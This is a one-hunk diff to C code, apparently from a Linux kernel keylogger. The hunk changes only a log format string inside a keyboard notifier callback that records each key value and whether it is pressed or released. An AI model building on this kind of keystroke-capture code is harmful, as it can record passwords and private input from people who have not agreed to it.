@@ -43,7 +43,7 @@ int keylogger_notify(struct notifier_block* blk, unsigned long code, void* param
     
     // Log the event
     LOG_INFO(
-        "Keylogger event: %d %s", 
+        "Keylogger event: %d %s\n", 
         kbdParam->value,
         (kbdParam->down ? "down" : "up")
         );
